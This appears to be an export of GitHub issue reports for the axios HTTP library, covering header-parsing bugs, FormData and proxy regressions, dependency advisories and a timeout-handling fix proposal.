+import axios from 'axios';
+
+// Simulate a response with a quoted boundary parameter (common in multipart responses)
+const headers = new axios.AxiosHeaders();
+headers.set('content-type', 'multipart/form-data; boundary=""----=_Part_123""');
+
+const tokens = headers.get('content-type', true);
+console.log(tokens.boundary);
+// Actual:   '----=_Part_123'   ← includes the surrounding DQUOTE characters
+// Expected: '----=_Part_123'     ← DQUOTE delimiters must be stripped per RFC 9110
+```
+
+## Related second issue
+
+The regex `[^,;]+` used in `parseTokens` also captures trailing whitespace before a delimiter. So `charset=utf-8   ;` yields `'utf-8   '` instead of `'utf-8'`.
+
+## Root Cause
+
+In `lib/core/AxiosHeaders.js`, the `parseTokens` function assigns `match[2]` (the raw captured token value) directly to `tokens[match[1]]` without:
+1. Stripping surrounding double-quotes (required by RFC 9110 §5.6.4)
+2. Trimming trailing whitespace
+
+## Impact
+
+Any code that uses `headers.get('content-type', true)` and checks `tokens.boundary` will receive the value with quotes, causing string comparison failures. This affects multipart form data processing where the `Content-Type` boundary is frequently quoted by browsers and servers.
+
+## Expected Behavior
+
+Per [RFC 9110 §5.6.4](https://www.rfc-editor.org/rfc/rfc9110#section-5.6.4):
+> A quoted-string is a sequence of zero or more characters enclosed within double-quotes. The initial and final DQUOTE characters are not part of the value.
+"
+issue_body,11049,demonicdior-kiins,User,2026-06-30T02:01:25Z,closed,Security: form-data dependency vulnerable to CRLF Injection (CVE / npm advisory #1120743),"## 🔒 Security Vulnerability Report
+
+### Summary
+
+`axios` has a transitive dependency on `form-data`, which contains a **high severity security vulnerability** related to **CRLF Injection** via unescaped multipart field names and filenames.
+
+---
+
+### Vulnerability Details
+
+| Field         | Detail                                                                 |
+|---------------|------------------------------------------------------------------------|
+| **Severity**  | High                                                                   |
+| **Package**   | `form-data`                                                            |
+| **Issue**     | CRLF injection via unescaped multipart field names and filenames       |
+| **Patched in**| `form-data >= 4.0.6`                                                   |
+| **Dependency**| `axios > form-data`                                                    |
+| **Advisory**  | https://www.npmjs.com/advisories/1120743                               |
+
+---
+
+### Reproduction
+
+Running `npm audit` or `yarn audit` in a project using `axios@^1.x` produces the following:
+
+```
+high       │ form-data: CRLF injection in form-data via unescaped
+           │ multipart field names and filenames
+Package    │ form-data
+Patched in │ >=4.0.6
+Dependency │ axios > form-data
+Path       │ axios > form-data
+More info  │ https://www.npmjs.com/advisories/1120743
+```
+
+---
+
+### Expected Behavior
+
+`axios` should update its dependency on `form-data` to **`>= 4.0.6`** so that consumers are not exposed to this vulnerability by default.
+
+---
+
+### Current Behavior
+
+`axios@1.x` currently depends on a version of `form-data` **below `4.0.6`**, which is flagged as vulnerable by `npm audit` / `yarn audit`.
+
+---
+
+### Suggested Fix
+
+Please upgrade the `form-data` dependency in `axios` to `>= 4.0.6`:
+
+```json
+// package.json (axios)
+""dependencies"": {
+  ""form-data"": ""^4.0.6""
+}
+```
+
+Or, if a major version bump is a concern, consider pinning via `overrides` / `resolutions` in the release until a proper upgrade path is available.
+
+---
+
+### Workaround (for consumers)
+
+As a temporary workaround, users can force-resolve the dependency via `package.json`:
+
+**npm (`overrides`):**
+```json
+{
+  ""overrides"": {
+    ""form-data"": "">=4.0.6""
+  }
+}
+```
+
+**yarn (`resolutions`):**
+```json
+{
+  ""resolutions"": {
+    ""form-data"": "">=4.0.6""
+  }
+}
+```
+
+---
+
+### Environment
+
+| Item            | Version  |
+|-----------------|----------|
+| `axios`         | `^1.18.1` |
+| `form-data`     | `< 4.0.6` (current transitive) |
+| Node.js         | `>= 24`  |
+
+---
+
+### References
+
+- npm advisory: https://www.npmjs.com/advisories/1120743
+- form-data changelog: https://github.com/form-data/form-data/releases
+
+```"
+issue_body,11042,magicdawn,User,2026-06-27T05:14:52Z,closed,feature-request: support `symbol` custom keys in `AxiosRequestConfig`,"use case: custom `AxiosRequestConfig` field
+
+```ts
+import axios from 'axios';
+
+export const someFlag = Symbol('some flag used in request interceptor')
+
+declare module 'axios' {
+  export interface AxiosRequestConfig {
+    [someFlag]?: boolean
+  }
+}
+
+await axios.get('/api/dashboard', { [someFlag]: true });
+```
+
+but current `mergeConfig` is using [`Object.keys`](https://github.com/axios/axios/blob/v1.17.0/lib/core/mergeConfig.js#L114) which is `owned enumerable string keys`, symbol keys are not included in `Object.keys`, cause the configured value always `undefined` in interceptors
+
+
+
+
+"
+issue_body,11030,jharzmann,User,2026-06-23T07:19:53Z,open,Old version of https-proxy-agent used,"### Summary
+axios is currently using version 5.0.1 of https-proxy-agent which was released 4 years ago and agent-base version 6 which was released 6 years ago.
+The most recent versions are 9.1.0 for https-proxy-agent (today 15 days old) and 9.0.0 for agent-base (3 months old).
+
+### Background
+With [this PR](https://github.com/axios/axios/pull/10858), the usage of [https-proxy-agent](https://www.npmjs.com/package/https-proxy-agent) was introduced. The version that was added is ^5.0.1.
+While this is not an issue in itself, some code scanners will flag this as outdated considering that this version is 4 years old. The package is actively worked on and is currently available in version 9.1.0.
+Additionally, using https-proxy-agent in version 5 introduces the usage of [agent-base](https://www.npmjs.com/package/agent-base) in version 6 which is 6 years old (the most current version is 9.0.0 which was released 3 months ago).
+
+I'm opening this issue as non-maintainers are [not allowed to open PRs to update dependencies](https://github.com/axios/axios/blob/v1.x/CONTRIBUTING.md#dependency-and-github-actions-updates)."
+issue_body,11009,adisetia0902-eng,User,2026-06-15T10:23:42Z,closed,Metasploit fremwok dan linuk,Yayyy grilled salted egg dumplings
+issue_body,11008,fuxiaozhen9606-star,User,2026-06-15T03:41:09Z,closed,"buildFullPath.js:24 Uncaught (in promise) AxiosError: Invalid URL: missing ""//"" after protocol axios 1.18.0","buildFullPath.js:24 Uncaught (in promise) AxiosError: Invalid URL: missing ""//"" after protocol
+
+<img width=""3080"" height=""586"" alt=""Image"" src=""https://github.com/user-attachments/assets/2b3caea5-453f-4b21-9bf5-29c7b9062282"" />
+
+<img width=""1456"" height=""756"" alt=""Image"" src=""https://github.com/user-attachments/assets/aa39f846-0894-4ce7-ab70-bf6a8f82b251"" />"
+issue_body,11004,celesteking,User,2026-06-11T19:43:45Z,closed,"why is this so badly written, guys?","I search for axios info in google and all I get is random sites and not a single reference to the official docs. Are you doing something to deter google engines from crawling and analyzing your stuff?
+I ask Gemini and it's providing inadequate and outdated info (probably pulled from those random sites).
+
+Why is https://axios.rest/ missing the search functionality?
+Why is there an API reference in README? Put it into a separate file, put up an overview of what the software does and a couple of examples in README, along with info on where to look for more.
+
+Why is ""site:https://axios.rest logging"" in google returning only 4 results? Logging is the first and foremost of any software. You MUST have it. How am I supposed to see what data is being sent and received? This is crucial, make it a built-in, a quick toggle. I have no time to code interceptors or whatever.
+
+Can't believe I'm coming across something so terribly managed."
+issue_body,10998,VikramSingh1994,User,2026-06-09T17:38:17Z,closed,[Axios 0.32.0] : Prototype Pollution still reporting in this version by snyk.,"Hi @jasonsaayman ,
+Could you please scan and check once snyk report for this version. If its false positive please request to snyk to clean it.
+https://security.snyk.io/package/npm/axios/0.32.0
+https://security.snyk.io/package/npm/axios/versions?page=1
+Thanks.
+
+<img width=""561"" height=""347"" alt=""Image"" src=""https://github.com/user-attachments/assets/6a4b8650-0222-47b4-9e23-361c58266f29"" />"
+issue_body,10994,weaversam8,User,2026-06-08T14:43:19Z,closed,"docs: `proxy` option in request config should be marked as ""Node.js only""","HTTP's `CONNECT` (used by Axios for proxying) is [a forbidden method](https://fetch.spec.whatwg.org/#forbidden-method) in [the WHATWG Fetch standard](https://fetch.spec.whatwg.org), unsupported by browsers. Axios' [Request config docs](https://axios.rest/pages/advanced/request-config.html) tag some options as ""Node.js only"", but `proxy` is not tagged as such. If it's unsupported in browsers, it should be tagged as ""Node.js only""."
+issue_body,10990,VictorPuga,User,2026-06-04T01:54:33Z,closed,Remove direct usage of Buffer,"When using this package in a Next.js application, it seems like the bundler is adding the `buffer` node module so it is available in the browser.
+
+This package only uses the Buffer when [converting to form data](https://github.com/axios/axios/blob/a8e4f13aeecc45a3b8fab3ecfd9ddb5d70fb772b/lib/helpers/toFormData.js#L141). We can look into alternatives that don't include the buffer module, like Uint8Array or similar browser-native APIs.
+
+---
+
+To reproduce the issue:
+
+Create a Next.js application from a template
+
+```bash
+# Create app
+yarn create next-app analyze-bundles-app
+
+# Navigate to the directory
+cd analyze-bundles-app
+
+# Install the module
+yarn axios
+```
+
+
+Update `app/page.tsx` to use the module
+
+```tsx
+""use client"";
+import axios from ""axios"";
+import { useEffect } from ""react"";
+
+export default function Home() {
+  useEffect(() => {
+    axios
+      .get(""https://jsonplaceholder.typicode.com/todos/1"")
+      .then((response) => {
+        console.log(response.data);
+      });
+  }, []);
+  return <div>hello world</div>;
+}
+
+```
+
+Make a production build with the analyzer plugin
+
+```bash
+yarn next experimental-analyze
+```
+
+When the reports are created, open http://localhost:4000 and see that the buffer module is included in the bundle.
+
+<img width=""1764"" height=""1132"" alt=""Image"" src=""https://github.com/user-attachments/assets/580b6589-d19d-4eb5-a4ee-cd06383c69fc"" />"
+issue_body,10987,Forkiy,User,2026-06-03T12:50:39Z,closed,Unexpected default maxBodyLength enforcement by follow-redirects,"Axios should treat the default maxBodyLength as unlimited consistently across the native Node transport and follow-redirects. Without explicitly passing an unlimited value to follow-redirects, its built-in 10MB request body cap can reject large requests even though axios defaults maxBodyLength to -1."
+issue_body,10986,Forkiy,User,2026-06-03T11:58:18Z,closed,Unexpected default maxBodyLength enforcement by follow-redirects,"Axios currently documents maxBodyLength as a request body size option, but the default sentinel -1 should behave as unlimited consistently across the Node HTTP adapter. When redirects are enabled, follow-redirects can enforce its own undocumented default if axios does not pass an explicit unlimited value. This issue tracks making the default behavior consistent regardless of maxRedirects and documenting the behavior."
+issue_body,10982,celpha2svx,User,2026-06-01T09:45:17Z,open,Benchmark idea: FormData-to-JSON conversion with nested keys,"## Benchmark-first note on FormData-to-JSON conversion
+
+Hi Axios maintainers,
+
+I am building and testing an open-source code analysis tool called Solvix:
+
+https://github.com/celpha2svx/solvix
+
+While validating it on a fresh Axios clone, I reviewed one finding manually and narrowed it to a small benchmarkable area: formDataToJSON() in lib/helpers/formDataToJSON.js.
+
+This is not a bug report. The bounded observation is that formDataToJSON() shows measurable depth-related conversion cost when handling many nested FormData keys.
+
+### What I measured
+
+I measured formDataToJSON() directly with three valid FormData key shapes:
+
+- flat fields, like field0
+- indexed nested fields, like items[0][name]
+- deeper nested fields, like root[level][items][0][metadata][status]
+
+Each case used:
+
+- 100 FormData fields
+- 100 conversions per timing run
+- 5 repeated timing runs
+- one warm call before measurement
+- Node.js performance.now()
+
+### Local result
+
+This was run against Axios commit 030e722 from 2026-05-30, on Windows with Node.js v24.14.0, on an Intel Pentium N4200 laptop with about 4 GB RAM. Absolute timings will vary; the relative scaling across input shapes is the signal worth checking.
+
+```text
+Axios formDataToJSON baseline
+node_version, v24.14.0
+case, fields, runs, mean_ms, stdev_ms, per_run_ms
+flat_100, 100, 100, 18.244, 5.572, 0.1824
+indexed_100, 100, 100, 37.177, 5.988, 0.3718
+deep_100, 100, 100, 64.411, 1.460, 0.6441
+```
+In this run, indexed nested keys took about 2.0x the flat case, and deeper nested keys took about 3.5x the flat case for the same number of fields.
+
+Why I think this may be worth checking
+For ordinary small forms, this probably does not matter. The case that may be worth protecting is larger generated FormData, especially when users call axios.formToJSON() directly or submit FormData with JSON content type.
+
+The current implementation parses each field name into a path, recursively builds the output object, handles duplicate fields, and preserves important security behavior such as prototype pollution protection. I am not suggesting that this behavior is wrong.
+
+The suggestion is simply to add a small benchmark around formDataToJSON() so future changes can preserve both correctness and conversion cost.
+
+Suggested next step
+Would a benchmark-only PR for formDataToJSON() be useful?
+
+I would keep it limited to flat, indexed, and deep FormData key shapes, with no runtime behavior changes."
+issue_body,10962,walmav,User,2026-05-29T21:51:26Z,closed,GHSA-pjwm-pj3p-43mv: Incorrect vulnerable version range (shouldBypassProxy),"## Summary
+
+The GitHub Security Advisory [GHSA-pjwm-pj3p-43mv](https://github.com/advisories/GHSA-pjwm-pj3p-43mv) has an incorrect vulnerable version range for the 1.x line.
+
+## Current (Incorrect)
+
+```
+vulnerable_version_range: "">= 1.0.0, < 1.16.0""
+```
+
+## Should Be
+
+```
+vulnerable_version_range: "">= 1.15.0, < 1.16.0""
+```
+
+## Evidence
+
+The advisory describes a vulnerability in the `shouldBypassProxy` function. However, this function was **introduced in version 1.15.0** and does not exist in earlier versions.
+
+### Verification
+
+```bash
+# axios@1.13.2 - NO shouldBypassProxy function exists
+$ npm pack axios@1.13.2 && tar -xzf axios-1.13.2.tgz
+$ grep -r ""shouldBypassProxy"" package/
+# (no results)
+
+# axios@1.15.0 - shouldBypassProxy function EXISTS
+$ npm pack axios@1.15.0 && tar -xzf axios-1.15.0.tgz
+$ grep -r ""shouldBypassProxy"" package/
+package/lib/helpers/shouldBypassProxy.js
+package/dist/node/axios.cjs:function shouldBypassProxy(location) {
+```
+
+The advisory description itself states:
+
+> ""shouldBypassProxy, **introduced in v1.15.0** to fix CVE-2025-62718...""
+
+Versions prior to 1.15.0 cannot be vulnerable to a bug in code that doesn't exist.
+
+## Impact
+
+This incorrect range causes:
+- **npm audit** to flag axios 1.0.0-1.14.x as vulnerable when they are not
+- **Socket.dev** and other SCA tools to generate false positive alerts
+- Unnecessary upgrade pressure on projects using stable 1.13.x versions
+
+## Suggested Fix
+
+Update the advisory to change the 1.x vulnerable range from:
+- `>= 1.0.0, < 1.16.0`
+
+To:
+- `>= 1.15.0, < 1.16.0`
+
+The 0.x range (`<= 0.31.1` patched in `0.32.0`) appears correct if `shouldBypassProxy` was backported to the 0.x line.
+
+---
+
+Discovered during automated vulnerability triage."
+issue_body,10953,jschweik,User,2026-05-27T21:27:22Z,closed,Problem handling self signed cert for proxy in 1.16.1,"In 1.16.0 and prior a call with proxy would succeed if the certificate were self signed as long as either rejectUnauthorized was overridden to false or the certificate itself was set.
+
+```
+const options = {
+    method: 'GET',
+    url: `https://mydomain.com`,
+    proxy: {
+      protocol: 'https',
+      host: '127.0.0.1',
+      port: '8080'
+    },
+    httpsAgent: new https.Agent({
+      rejectUnauthorized: false,
+      ca: certificateData
+    })
+  };
+
+  const response = await axios.request(options);
+```
+
+In 1.16.1, regardless of these values, you are met with a ""self-signed certificate in certificate chain"" error.
+
+With the https-proxy-agent changes in 1.16.1, is there a different way to either provide the cert or have it ignored for a specific request?"
+issue_body,10951,matthias-ccri,User,2026-05-27T18:20:31Z,closed,Document 1.0.0 breaking changes,"The breaking changes for v1 are not documented.
+
+Checked here:
+- https://github.com/axios/axios/blob/v1.x/CHANGELOG.md#100---2022-10-04
+- https://github.com/axios/axios/releases/tag/v1.0.0 (same content)
+- https://github.com/axios/axios/blob/v1.x/MIGRATION_GUIDE.md (empty)
+
+There is a ""Changed"" section but it has content like ""Updated eslint config"" which is not a good sign at all.
+
+From a user's perspective, if a library doesn't track breaking changes, that's a big red flag. Why is `v.1.0.0` a major bump?
+
+Consider the consumers of your library and please document it.
+
+For future people: we can submit PRs populating `MIGRATION_GUIDE.md` with info."
+issue_body,10950,dword-design,User,2026-05-27T13:58:40Z,closed,"Why does AxiosHeaderValue allow string, string[] and another AxiosHeaders instance?","Ins there a reason why there are so many possible types for the headers values (see [AxiosHeaderValue](https://github.com/axios/axios/blob/v1.x/index.d.ts#L4))? I'm expecting just a key-value object.
+
+Migrated to [ofetch](https://www.npmjs.com/package/ofetch) for now where it's only a map."
+issue_body,10940,aldiboncel49-lgtm,User,2026-05-23T16:39:48Z,closed,Security review — multiple findings: 1 potential issues,"## Potential security concerns in axios/axios
+
+Found 1 items: 0 critical, 1 high, 0 medium, 0 low.
+
+
+
+potential-hardcoded-credentials -- tests/smoke/esm/tests/instance.smoke.test.js line 133
+
+Severity: HIGH
+
+Language: JS/TS
+
+
+Potential hardcoded credentials
+
+
+apiKey: 'abc',
+
+
+
+Some of these might be false positives. Happy to provide more context if any look actionable."
+issue_body,10938,aldiboncel49-lgtm,User,2026-05-23T04:31:41Z,closed,Security review 1 potential issues found,"## Security concerns in axios/axios
+
+I was looking through the codebase and found some patterns that might be security-sensitive.
+
+---
+
+
+### potential — tests/smoke/esm/tests/instance.smoke.test.js`:133
+
+**Severity:** HIGH
+
+
+Potential hardcoded credentials
+
+
+---
+
+Some of these might be false positives — just wanted to put them on your radar.
+"
+issue_body,10908,dotNomad,User,2026-05-18T20:11:51Z,closed,`socket.setKeepAlive is not a function` from HTTP adapter when using certain proxy agents,"After upgrading to `axios` `1.16.1` we had a `TypeError` failure reported for one of our open source projects: https://github.com/posit-dev/publisher/issues/3102#issuecomment-4467839466
+
+```
+TypeError: socket.setKeepAlive is not a function
+    at handleRequestSocket (axios/lib/adapters/http.js:1067)
+```
+
+The line that throws is here:
+
+https://github.com/axios/axios/blob/26a8729623e9162a70886f4185fae2f75adcd4f0/lib/adapters/http.js#L1177
+
+`1.16.1` changed the proxy code path. PR #10858 internalized `https-proxy-agent`, which is built on [`agent-base`](https://www.npmjs.com/package/agent-base). `agent-base`'s contract is an arbitrary Duplex stream, not a `net.Socket` — and `setKeepAlive` is a TCP-only method that doesn't exist on a generic Duplex.
+
+### Suggested fix
+
+One suggestion is to check whether `setKeepAlive` is available in this section of the HTTP adapter:
+
+```
+if (typeof socket.setKeepAlive === 'function') {
+  socket.setKeepAlive(true, 1000 * 60);
+}
+```
+
+The rest of the listener already works for a generic stream.
+"
+issue_body,10903,clementcontet,User,2026-05-18T13:25:45Z,closed,"Since v1.16.0, the fetch adapter loses the user-agent of some devices","I work on a web application that runs on custom set-top boxes.
+
+Before v1.16.0, requests made with the fetch adapter correctly sent the user-agent of my device.
+
+Since v1.16.0, the user-agent is replaced by `axios/1.16.x`, as if it was not set by the native `fetch` API.
+
+On other devices, the user-agent is correctly sent, so there must be something in theses set-top boxes that axios 1.16 doesn't like. But I can't figure out what it is."
+issue_body,10895,akshayb03,User,2026-05-15T06:17:12Z,closed,FormData requests crash on RN Android due to incorrect default Content-Type,"## Environment
+- axios version: 1.x
+- Platform: React Native Android
+- iOS: not affected
+
+## What happens
+Calling `axios(config)` with a `FormData` body on React Native Android throws:
+```
+java.lang.IllegalArgumentException: multipart != application/x-www-form-urlencoded
+at okhttp3.MultipartBody$Builder.setType(MultipartBody.kt:241)
+at com.facebook.react.modules.network.NetworkingModule.constructMultipartBody(NetworkingModule.kt:697)
+at com.facebook.react.modules.network.NetworkingModule.sendRequestInternal(NetworkingModule.kt:463)
+at com.facebook.react.modules.network.NetworkingModule.sendRequest(NetworkingModule.kt:221)
+```
+
+The request never reaches the server. It fails locally inside React Native's NetworkingModule during multipart body construction.
+
+## Root cause
+In dispatchRequest.js, axios sets a default Content-Type for POST/PUT/PATCH requests:
+
+```javascript
+config.headers.setContentType('application/x-www-form-urlencoded', false);
+```
+
+Later, in resolveConfig.js, axios clears the Content-Type for FormData - but only for browser and Node.js environments:
+
+```javascript
+if (utils.isFormData(data)) {
+  if (platform.hasStandardBrowserEnv || platform.hasStandardBrowserWebWorkerEnv) {
+    headers.setContentType(undefined); // browser handles it
+  } else if (utils.isFunction(data.getHeaders)) {
+    // Node.js form-data package
+    setFormDataHeaders(headers, data.getHeaders(), own('formDataHeaderPolicy'));
+  } 
+}
+```
+
+As a result, the default ```application/x-www-form-urlencoded``` is never cleared for React Native FormData requests. That header reaches React Native's NetworkingModule, which then attempts to construct a multipart request using the incorrect content type, causing OkHttp to throw the error.
+
+## Current workaround
+At our API layer, while making the request, adding the following block prevents axios from applying the default ```application/x-www-form-urlencoded``` header for FormData requests:
+
+```javascript
+if (body instanceof FormData) {
+  headers['Content-Type'] = false;
+}
+```
+`AxiosHeaders.set()` guards against overwriting a `false` value, and `AxiosHeaders.toJSON()` drops `false` values before serializing headers. As a result, React Native's NetworkingModule receives no Content-Type header and correctly defaults to multipart/form-data.
+
+### Additional note
+
+This issue affects the axios(config) request path directly and is independent of the recent postForm / patchForm helper fixes.
+
+
+cc @jasonsaayman @DigitalBrainJS"
+issue_body,10888,jasonsaayman,User,2026-05-13T16:40:25Z,closed,Fetch adapter ignores `timeoutErrorMessage` and `transitional.clarifyTimeoutError` (timeout error parity),"Tracking issue for a maintainer to pick up. Splits the legitimate fix out of #7248 so the parity bug can land cleanly on the current test layout.
+
+## Background
+
+`timeoutErrorMessage` and `transitional.clarifyTimeoutError` are honoured by the xhr and http adapters but not by the fetch adapter. For identical config, fetch produces a different message and a different error code than the others.
+
+xhr (`lib/adapters/xhr.js:134-144`) and http (`lib/adapters/http.js:586-595`):
+
+- Default code: `ECONNABORTED`.
+- `transitional.clarifyTimeoutError === true` → code becomes `ETIMEDOUT`.
+- `config.timeoutErrorMessage` overrides the default message.
+
+fetch (`lib/adapters/fetch.js` → `lib/helpers/composeSignals.js:33`):
+
+- Always emits `new AxiosError('timeout of ${timeout}ms exceeded', AxiosError.ETIMEDOUT)`.
+- No `timeoutErrorMessage` override, no respect for `clarifyTimeoutError`.
+
+So a browser/WebWorker caller and a Node caller running the same axios config get different `err.code` and different `err.message` on timeout.
+
+## Proposed fix
+
+Largely the shape of #7248, with corrections below.
+
+**`lib/helpers/composeSignals.js`** — accept `options` and use it on the timeout branch:
+
+```js
+const composeSignals = (signals, timeout, options = {}) => {
+  // …existing code…
+  let timer = timeout && setTimeout(() => {
+    timer = null;
+    const { transitional, timeoutErrorMessage } = options;
+    const clarify = transitional && transitional.clarifyTimeoutError;
+    const message = timeoutErrorMessage || `timeout of ${timeout}ms exceeded`;
+    onabort(new AxiosError(
+      message,
+      clarify ? AxiosError.ETIMEDOUT : AxiosError.ECONNABORTED
+    ));
+  }, timeout);
+```
+
+Notes vs #7248:
+
+- Don't pull `transitionalDefaults` into `composeSignals.js` — the helper shouldn't carry adapter-level defaults. `dispatchRequest`/`mergeConfig` already produce `config.transitional` populated with defaults; the adapter passes it through. Keeps the helper generic and avoids a coupling that doesn't exist for xhr/http.
+- Keep the message format `timeout of ${timeout}ms exceeded` (matches xhr/http exactly — same string).
+
+**`lib/adapters/fetch.js`** — destructure the two fields off `config` and pass through:
+
+```js
+let composedSignal = composeSignals(
+  [signal, cancelToken && cancelToken.toAbortSignal()],
+  timeout,
+  { timeoutErrorMessage, transitional }
+);
+```
+
+## Tests
+
+Repo migrated to Vitest under `tests/unit/**/*.test.js`. The PR's mocha tests at `test/unit/...` need to be ported.
+
+- `tests/unit/helpers/composeSignals.test.js` (new):
+  - Default timeout error has code `ECONNABORTED` and message `timeout of {n}ms exceeded`.
+  - `options.timeoutErrorMessage` overrides the message.
+  - `options.transitional.clarifyTimeoutError === true` switches code to `ETIMEDOUT`.
+  - **Listener race**: register all `abort` listeners synchronously *before* awaiting, or check `signal.aborted` and use `signal.reason` immediately. The original PR's sequential `for…of await new Promise(resolve => signal.addEventListener('abort', …))` loop can hang when an earlier signal's timer fires before its listener is attached on a later iteration (Qodo flagged this).
+- `tests/unit/adapters/fetch.test.js` additions:
+  - Default fetch timeout error is `ECONNABORTED` (currently `ETIMEDOUT` — this is the visible bug).
+  - `timeoutErrorMessage` is surfaced through fetch.
+  - `clarifyTimeoutError: true` switches fetch timeout to `ETIMEDOUT`.
+
+## Compatibility note
+
+The default code change `ETIMEDOUT → ECONNABORTED` for fetch timeout is technically a behaviour change for anyone matching `err.code === 'ETIMEDOUT'` on the fetch adapter today. That's the right direction — it's the documented default and matches xhr/http — but it's worth calling out in the release notes when this ships. Callers that want `ETIMEDOUT` can opt in via `transitional.clarifyTimeoutError`.
+
+## Acceptance
+
+- `composeSignals` accepts `{ timeoutErrorMessage, transitional }` and uses them on the timeout branch.
+- Fetch adapter passes both through from config.
+- Vitest coverage for the three behaviours above on both the helper and the fetch adapter, with no listener-attach race.
+- Closes #7248 when this ships."
+issue_body,10886,jasonsaayman,User,2026-05-13T16:35:15Z,closed,Drop forced bare `multipart/form-data` placeholder header in `postForm`/`putForm`/`patchForm` (breaks RN Android),"Tracking issue for a maintainer to pick up. Splits the legitimate fix out of #7243 so the actual bug from #6968 can land cleanly.
+
+## Background
+
+`axios.postForm` / `putForm` / `patchForm` in `lib/core/Axios.js` currently force a placeholder header on the overlay config:
+
+```js
+headers: isForm ? { 'Content-Type': 'multipart/form-data' } : {}
+```
+
+The intent is to let the adapter rewrite this with a real boundary later. That works on:
+
+- The browser XHR adapter (the platform appends the boundary).
+- The Node HTTP adapter via the `form-data` package (`getHeaders()` overwrites it).
+- The fetch adapter / spec-compliant `FormData` via `formDataToStream` (boundary attached).
+
+It does **not** work on **React Native Android**. RN is neither `hasStandardBrowserEnv` (axios deliberately excludes RN in `resolveConfig`) nor does it use `form-data`. The bare placeholder reaches the wire untouched, and Android's networking layer rejects `multipart/form-data` without a boundary. iOS is more permissive, which is why this only reproduces on Android.
+
+Original report: #6968. Attempted fix: #7243 (closed — see review for why that diff isn't the right shape).
+
+## Proposed fix
+
+In `lib/core/Axios.js`, in the `post`/`put`/`patch` helper factory, drop the placeholder entirely:
+
+```js
+return this.request(mergeConfig(config || {}, {
+  method,
+  url,
+  data
+}));
+```
+
+(Or `headers: {}` if we'd rather be explicit.) `config.headers` is already merged in by `mergeConfig(config || {}, …)` — the second argument is the overlay, not the source — so anything the caller passes still flows through. No placeholder, nothing to overwrite, no Android breakage.
+
+The `toFormData.js` changes in #7243 should **not** be carried over:
+
+- `Function('return this')()` is `eval` in a different shape; trips CSP without `unsafe-eval` (most production browsers behind a CSP, several RN setups).
+- The precedence flip from `PlatformFormData || FormData` to `runtimeFD || PlatformFormData` silently breaks Node: Node 18+ has global `FormData`, so this picks the spec-compliant one over `form-data`, and any caller of `axios.toFormData(obj)` on Node who relied on `.getHeaders()` / `.getLength()` gets an object without them.
+- It isn't needed for the RN bug — RN bundlers resolve the `browser` field in `package.json`, so `PlatformFormData` already points at `lib/platform/browser/classes/FormData.js`, which resolves to the RN runtime's `FormData`.
+
+## Tests required
+
+- `postForm` / `putForm` / `patchForm` no longer emit a bare `Content-Type: multipart/form-data` placeholder.
+- Node `form-data` path still ends up with `Content-Type: multipart/form-data; boundary=…` via `getHeaders()`.
+- Spec-compliant `FormData` path through the http adapter still gets a boundary via `formDataToStream`.
+- Caller-provided `Content-Type` on the request config is preserved through the FormData helpers.
+
+## Acceptance
+
+- Fix lands in `lib/core/Axios.js` only.
+- Regression tests in `tests/unit/` covering the three paths above.
+- #6968 closes when this ships."
+issue_body,10885,jasonsaayman,User,2026-05-13T16:08:28Z,open,Undici adapter: pick up and finish PR #6915,"Tracking issue for a maintainer to pick up and finish the Undici adapter work originally proposed in #6915 by @niksy.
+
+The PR has been open since May 2025, is in a conflicting state against `v1.x`, has unresolved review feedback, and has stalled. Rather than leaving it indefinitely open, this issue captures the remaining work so it can be picked up cleanly (either by rebasing #6915 with the fixes below, or by starting fresh and crediting the original author).
+
+## Context
+
+#6915 adds an Undici adapter that uses `undici.request` as the fast path and falls back to `undici.fetch` for streams / FormData. Benchmarks in the PR show meaningful throughput gains over the existing fetch adapter, so the underlying idea is worth landing — it just needs the rough edges sorted before it's safe to ship.
+
+## Required changes before merge
+
+### Blockers
+
+- **Module load will break installs without undici.** `lib/adapters/adapters.js` is always-loaded, and the PR does a top-level `import undici, {Request, Response} from \""undici\""`. With undici only in `devDependencies`, resolution fails before any runtime guard can run. Register with the `{ get }` pattern used by the fetch adapter (see `lib/adapters/adapters.js:19-22`), do a dynamic `await import('undici')` inside, and return `false` if undici isn't installed.
+- **`package.json` surface is wrong.** undici should be an optional `peerDependency`, not a devDep. The `browser` field needs an entry mapping `lib/adapters/undici.js` to `lib/helpers/null.js`, mirroring the existing `http.js` shim — otherwise dead Node-only code ships in the browser bundle.
+- **Drop `'undici'` from the default adapter chain.** With `['xhr','http','fetch','undici']`, `http` always wins in Node, so undici is never reached anyway. Keep it opt-in via explicit `adapter: 'undici'`. This also addresses the bundle/dependency-size concern @DigitalBrainJS raised.
+- **`maxContentLength` / `maxBodyLength` are not enforced on the undici path.** The fetch adapter checks pre-dispatch and via the `trackStream` chunk callback; neither runs here. This silently regresses [GHSA-vf2m-468p-8v99](https://github.com/axios/axios/security/advisories/GHSA-vf2m-468p-8v99) for anyone choosing the undici adapter. Hard blocker.
+- **Response shape mismatch.** `undici.request` returns `{ statusCode, headers, body, trailers }`, not a Fetch `Response`. The current `settle` call reads `response.status` / `response.statusText`, both `undefined` on the fast path, so `validateStatus` doesn't behave correctly. Body resolution happens to work because `body` is a `BodyMixin`, but that's a coincidence — normalize the response shape explicitly.
+
+### Behavioral correctness
+
+- **`maxRedirections: config.maxRedirects` passed through verbatim is a foot-gun.** undici defaults that to `0`; the http adapter defaults to `21`. A user picking `adapter: 'undici'` without explicitly setting `maxRedirects` silently loses redirect following. Map this correctly.
+- **Catch up with the fetch adapter.** It has moved on substantially since May 2025 and a lot of that delta is missing:
+  - `data:` URL short-circuit via `estimateDataURLDecodedBytes`
+  - default `User-Agent: axios/<VERSION>`
+  - Safari/abort branch that prefers `composedSignal.reason` to disambiguate timeout vs cancel
+- **Copilot's review caught a real bug:** in upload progress handling, the original HTTP method is overridden to `'POST'`, breaking PUT/PATCH/etc. (`lib/adapters/undici.js:133` in the PR).
+
+### Architectural direction
+
+@DigitalBrainJS pushed back on copy-pasting the fetch adapter — duplicates logic, drift risk, and doubles the surface for future security fixes. Given how much of the work above is essentially \""reapply fetch-adapter changes,\"" the cleaner shape is probably a thin wrapper that normalizes `undici.request`'s response into a Fetch-ish object and then funnels through the existing fetch adapter, rather than maintaining a parallel implementation. Worth deciding up front before redoing the porting work.
+
+### Housekeeping
+
+- Remove committed `dist/` artifacts from the PR.
+- Move test file to `tests/unit/adapters/undici.test.js` to match the current layout.
+- Drop the `abortcontroller-polyfill` import — `AbortController` is a global on every Node version we still support.
+- Remove the leftover `// used only inside the fetch adapter` comment on line 14 (copy-paste from fetch.js).
